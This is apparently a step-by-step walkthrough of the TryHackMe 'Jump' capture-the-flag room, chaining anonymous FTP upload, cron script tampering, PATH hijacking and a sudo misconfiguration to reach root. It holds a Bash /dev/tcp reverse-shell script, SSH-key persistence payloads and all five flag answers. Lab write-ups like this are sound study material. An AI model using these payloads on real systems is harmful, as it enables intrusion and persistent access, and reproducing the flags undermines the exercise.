# TryHackMe – Jump

## Complete Walkthrough | Linux Privilege Escalation

**Platform:** TryHackMe  
**Room:** Jump  
**Target OS:** Linux  
**Objective:** Gain initial access, move between different user accounts, and retrieve all five flags, including the root flag.

---

# 1. Getting Started

Start the Jump room on TryHackMe and wait for the target machine to become available.

Connect your Kali Linux machine to the TryHackMe network and copy the target IP address.

For this walkthrough, the target IP is:

```
10.65.132.164
```

Create a working directory:

```
mkdir -p ~/TryHackMe/Jump
cd ~/TryHackMe/Jump
```

Save the target IP:

```
echo "10.65.132.164" > target.txt
```

Set an environment variable so you don't have to type the IP address repeatedly:

```
export ip=$(cat target.txt)
```

You can now use `$ip` in your commands.

For example:

```
ping -c 3 $ip
```

To keep the variable available in future Zsh sessions, add it to your Zsh configuration:

```
echo 'export ip=10.65.132.164' >> ~/.zshrc
source ~/.zshrc
```

**Important:** Replace the example target IP with the address assigned to your own TryHackMe machine.

# 2. Reconnaissance – Nmap Scan

Let's start by identifying the open ports and services running on the target.

Run an Nmap scan:

```
nmap --privileged -sC -sS -oN nmapScan.txt $ip
```

Here's what the options mean:

- `--privileged` – Tells Nmap to assume that the user has sufficient privileges for privileged scanning operations.
    
- `-sC` – Runs Nmap's default scripts.
    
- `-sS` – Performs a TCP SYN scan.
    
- `-oN` – Saves the scan results in normal text format.
    

The results are saved in:

```
nmapScan.txt
```

### Open Ports

The scan reveals two open TCP ports:

|Port|Service|
|---|---|
|21/tcp|FTP|
|22/tcp|SSH|

The FTP service is running vsFTPd 3.0.5.

Something interesting also appears in the FTP enumeration:

```
ftp-anon: Anonymous FTP login allowed

incoming/
pub/
```

The `incoming` directory has world-writable permissions:

```
drwxrwxrwx
```

This means anonymous users can upload files into that directory.

Let's investigate FTP further.

# 3. FTP Enumeration

Connect to the target's FTP service:

```
ftp $ip
```

At the login prompt, enter:

```
Username: anonymous
Password: [Press Enter]
```

After logging in, list the available files and directories:

```
ls
```

Look for `README.txt` in the FTP root directory.

Download it:

```
get README.txt
```

Exit FTP:

```
bye
```

Read the downloaded file from your Kali terminal:

```
cat README.txt
```

The README explains that the FTP service contains an automated recon pipeline. Files uploaded into `incoming` are processed automatically.

This is the important finding.

We have a writable upload directory, and the target has an automated process that handles uploaded scripts.

That gives us a potential route to initial access.

# 4. Initial Access – recon_user

### Step 1: Start Penelope

We need a listener to receive the reverse-shell connection.

For this, we'll use Penelope.

GitHub repository:

[https://github.com/brightio/penelope](https://github.com/brightio/penelope)

Download Penelope:

```
wget -q https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py
```

Start it:

```
python3 penelope.py
```

Penelope will start listening for incoming reverse-shell connections, using port `4444` by default in this setup.

Keep it running.

### Step 2: Find Your Kali IP Address

Open another Kali terminal and check your network route to the target:

```
ip route get $ip
```

Look for the address after `src`.

This is the address you will use in the reverse-shell payload.

For this example, we'll use:

```
YOUR_KALI_IP
```

Replace it with your actual Kali VPN-reachable IP address.

### Step 3: Create the Reverse-Shell Script

Create a file named `shell2.sh`:

```
nano shell2.sh
```

Add the following:

```
#!/bin/bash
/bin/bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1
```

Save the file.

Make it executable:

```
chmod +x shell2.sh
```

The script starts an interactive Bash shell and redirects the connection back to your Kali machine on port `4444`.

### Step 4: Upload the Script to FTP

Connect to FTP again:

```
ftp $ip
```

Log in anonymously.

Navigate to the writable directory:

```
cd incoming
```

Upload the script:

```
put shell2.sh
```

You should see that the file transfer has completed.

The target's recon pipeline processes uploaded scripts automatically. Wait for the pipeline to execute the file.

### Step 5: Receive the Reverse Shell

Return to Penelope.

You should receive a new reverse-shell session from the target.

Check the session information.

The shell should belong to:

```
recon_user
```

Confirm your identity:

```
id
whoami
pwd
```

You should now have your first foothold on the machine.

### Step 6: Retrieve the First Flag

Check the home directory:

```
ls
```

You should find:

```
flag.txt
shell.sh
```

Read the flag:

```
cat flag.txt
```

**Flag 1 – recon_user**

```
THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}
```

Great! Initial access is complete.

# 5. Enumerating recon_user

Before moving to the next account, let's check the current user's permissions and group memberships.

Run:

```
id
```

You should see:

```
uid=1001(recon_user)
gid=1001(recon_user)
groups=1001(recon_user),1002(dev_user),1005(devops)
```

Notice that `recon_user` is also a member of the `dev_user` and `devops` groups.

This may provide access to files belonging to those groups.

Let's check the dev_user flag:

```
ls /home/dev_user/flag.txt
```

If the file is accessible, read it:

```
cat /home/dev_user/flag.txt
```

**Flag 2 – dev_user**

```
THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}
```

You have retrieved the second flag.

Remember, you are still operating as `recon_user`. Reading another user's accessible file does not automatically switch your account.

# 6. Enumerating Scheduled Tasks with pspy64

Now we need to investigate what automated processes are running on the target.

A useful tool for this is pspy64.

pspy monitors processes without requiring root privileges. It can reveal commands executed by other users, including scheduled jobs.

### Step 1: Download pspy64 on Kali

Open another Kali terminal:

```
cd ~/Downloads
```

Download the official 64-bit release:

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

Start a temporary HTTP server:

```
python3 -m http.server 8000
```

Keep the server running.

### Step 2: Transfer pspy64 to the Target

Return to the `recon_user` shell.

Download the binary:

```
wget http://YOUR_KALI_IP:8000/pspy64
```

Replace `YOUR_KALI_IP` with your Kali IP address.

Make it executable:

```
chmod +x pspy64
```

Run it:

```
./pspy64
```

### Step 3: Look for Scheduled Jobs

Allow pspy64 to run for a little while.

Look for a process similar to:

```
CMD: UID=1002 | /bin/bash /opt/dev/backup.sh
```

UID `1002` belongs to `dev_user`.

This reveals that the backup script is being executed automatically under the `dev_user` account.

Now check the script's permissions:

```
ls -l /opt/dev/backup.sh
```

You should find that the script is writable by the `dev_user` group.

Because `recon_user` belongs to that group, we can modify the script.

This is our next privilege-escalation opportunity.

# 7. Moving from recon_user to dev_user

We'll use SSH public-key authentication to access the next account.

### Step 1: Generate an SSH Key Pair

On Kali, generate an Ed25519 SSH key pair:

```
ssh-keygen -t ed25519 -f ~/.ssh/Jump_dev -N "" -C Jump_dev
```

This creates two files:

```
~/.ssh/Jump_dev
~/.ssh/Jump_dev.pub
```

The private key stays on Kali.

The public key will be added to the target user's `authorized_keys` file.

Display your public key:

```
cat ~/.ssh/Jump_dev.pub
```

Copy the complete output.

### Step 2: Modify backup.sh

Return to your `recon_user` shell.

Open the backup script:

```
nano /opt/dev/backup.sh
```

Keep the original backup command and add the SSH key configuration.

The script should look like this:

```
#!/bin/bash

tar -czf /tmp/recon_backup.tgz /home/recon_user

mkdir -p /home/dev_user/.ssh

echo 'YOUR_PUBLIC_KEY_HERE' >> /home/dev_user/.ssh/authorized_keys

chmod 700 /home/dev_user/.ssh

chmod 600 /home/dev_user/.ssh/authorized_keys
```

Replace `YOUR_PUBLIC_KEY_HERE` with the complete public key from:

```
cat ~/.ssh/Jump_dev.pub
```

Do not copy your private key into the target.

Save the script.

### Step 3: Wait for the Scheduled Backup

The backup script is executed automatically as `dev_user`.

Wait for the scheduled job to run. The key will then be added to:

```
/home/dev_user/.ssh/authorized_keys
```

The SSH permissions are also configured by the script.

You do not need to execute the backup script manually as `recon_user`.

### Step 4: Connect as dev_user

Return to Kali and connect using the private key:

```
ssh -i ~/.ssh/Jump_dev dev_user@$ip
```

Accept the host key prompt if it appears.

You should now have an SSH session as:

```
dev_user@tryhackme-2404
```

Confirm the account:

```
whoami
id
```

You have successfully moved from `recon_user` to `dev_user`.

# 8. Moving from dev_user to monitor_user

Now let's investigate the healthcheck service.

The room provides a hint explaining that the service executes the `ps` command without specifying its full path.

This creates a PATH hijacking opportunity.

### Step 1: Inspect the healthcheck Service

From the `dev_user` shell, check the service:

```
systemctl status healthcheck.service --no-pager
```

Inspect its configuration:

```
systemctl cat healthcheck.service
```

You should find settings similar to:

```
[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

Notice two important things:

- The service runs as `monitor_user`.
    
- `/opt/dev/bin` appears before `/usr/bin` in the PATH.
    

Now inspect the healthcheck script:

```
cat /usr/local/bin/healthcheck
```

You should find that it executes:

```
ps aux
```

The command is not using an absolute path.

This means Linux searches the directories in PATH to find the executable.

Since `/opt/dev/bin` comes first, a replacement `ps` placed there can be executed instead of the original system binary.

### Step 2: Inspect the Existing ps File

Check the directory:

```
ls -la /opt/dev/bin/
```

Inspect the existing file:

```
cat /opt/dev/bin/ps
```

The file is controlled by `dev_user`, so you can modify it.

### Step 3: Replace the ps Script

Open it:

```
nano /opt/dev/bin/ps
```

Replace its contents with:

```
#!/bin/bash

mkdir -p /home/monitor_user/.ssh

echo 'YOUR_PUBLIC_KEY_HERE' >> /home/monitor_user/.ssh/authorized_keys

chmod 700 /home/monitor_user/.ssh

chmod 600 /home/monitor_user/.ssh/authorized_keys

/usr/bin/ps "$@"
```

Replace `YOUR_PUBLIC_KEY_HERE` with the same public key you generated earlier.

Save the file.

Make sure it is executable:

```
chmod +x /opt/dev/bin/ps
```

The final line runs the original `ps` command. This allows the healthcheck script to continue performing its normal process check.

### Step 4: Wait for healthcheck to Execute

The healthcheck service repeatedly runs `ps` under the `monitor_user` account.

When it executes your replacement script, the SSH key will be added to:

```
/home/monitor_user/.ssh/authorized_keys
```

Give the service some time to execute.

The service should be active before you expect the key to be installed. If it is inactive, do not assume the payload has run; check the room's instance status and current hints.

### Step 5: Connect as monitor_user

From Kali, run:

```
ssh -i ~/.ssh/Jump_dev monitor_user@$ip
```

You should now have access as:

```
monitor_user@tryhackme-2404
```

Confirm:

```
whoami
id
```

Retrieve the third flag:

```
cat /home/monitor_user/flag.txt
```

**Flag 3 – monitor_user**

```
THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}
```

This flag value is cross-checked against published walkthroughs for the room.

You have successfully reached `monitor_user`.

# 9. Moving from monitor_user to ops_user

The next step involves the deployment helper.

### Step 1: Check Sudo Permissions

From the `monitor_user` shell, run:

```
sudo -l
```

Look for a rule similar to:

```
(ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

This means `monitor_user` can execute the deployment script as `ops_user` without a password.

But before executing it, let's inspect what the script actually does.

### Step 2: Inspect deploy.sh

Run:

```
cat /usr/local/bin/deploy.sh
```

You should find something similar to:

```
#!/bin/bash

cd /opt/app 2>/dev/null

./deploy_helper.sh
```

Notice that the deployment script changes into `/opt/app` and then executes `deploy_helper.sh` using a relative path.

Now check the helper's permissions:

```
ls -l /opt/app/deploy_helper.sh
```

The helper is writable by `monitor_user`.

This is the important part.

Although the main deployment script is executed as `ops_user`, it runs another script that `monitor_user` can modify.

That gives us a way to execute our own commands as `ops_user`.

### Step 3: Modify deploy_helper.sh

Open the helper:

```
nano /opt/app/deploy_helper.sh
```

Replace its contents with:

```
#!/bin/bash

echo "[+] Deploy helper running"

echo "[+] Syncing application files"

sleep 2

mkdir -p /home/ops_user/.ssh

echo 'YOUR_PUBLIC_KEY_HERE' >> /home/ops_user/.ssh/authorized_keys

chmod 700 /home/ops_user/.ssh

chmod 600 /home/ops_user/.ssh/authorized_keys
```

Replace `YOUR_PUBLIC_KEY_HERE` with your existing public SSH key.

Save the file.

Ensure the helper is executable:

```
chmod +x /opt/app/deploy_helper.sh
```

### Step 4: Execute the Deployment Script

Now execute the permitted command:

```
sudo -u ops_user /usr/local/bin/deploy.sh
```

You should see:

```
[+] Deploy helper running
[+] Syncing application files
```

Because the deployment wrapper runs the helper under `ops_user`, the SSH key is installed in:

```
/home/ops_user/.ssh/authorized_keys
```

### Step 5: Connect as ops_user

Return to Kali:

```
ssh -i ~/.ssh/Jump_dev ops_user@$ip
```

You should now have access as:

```
ops_user@tryhackme-2404
```

Check your identity:

```
whoami
id
```

Retrieve the fourth flag:

```
cat /home/ops_user/flag.txt
```

**Flag 4 – ops_user**

```
THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88}
```

That's four flags down!

# 10. Final Stage – Retrieving the Root Flag

We're almost done.

The final step is to check the sudo permissions available to `ops_user`.

Run:

```
sudo -l
```

Look for:

```
(root) NOPASSWD: /usr/bin/less
```

This means `ops_user` can execute `less` as root without entering a password.

Since `less` can read files, we can use it to access the root flag.

Run:

```
sudo -u root less /root/flag.txt
```

The contents of the file will appear inside the `less` pager.

**Flag 5 – root**

```
THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}
```

Press `q` to exit `less`.

And that's it!

You have successfully retrieved the root flag and completed the room.

**Note:** There is no need to open an interactive root shell for this task. Reading `/root/flag.txt` with the permitted root-level `less` command is sufficient to retrieve the final flag.

---

# 11. All Flags

|User|Flag|
|---|---|
|recon_user|`THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}`|
|dev_user|`THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}`|
|monitor_user|`THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}`|
|ops_user|`THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88}`|
|root|`THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}`|

# 12. Final Thoughts

The interesting part of this room is how the different user accounts rely on scripts and automated processes.

Each stage introduces a new opportunity:

- Anonymous FTP access allows us to upload a script.
    
- Group permissions allow `recon_user` to modify a backup script executed by `dev_user`.
    
- The healthcheck service uses an unsafe PATH configuration.
    
- The deployment wrapper executes a helper script that `monitor_user` can modify.
    
- Finally, `ops_user` has permission to run `less` as root.
    

None of these steps requires a complicated kernel exploit. The attack chain works by taking advantage of poorly configured permissions and trust between different user accounts.

The main lesson is simple:

**Always check who owns a script, who can modify it, which account executes it, and whether it calls other programs using absolute or relative paths.**

That's what makes this room worth understanding.

**Room completed – all five flags retrieved.  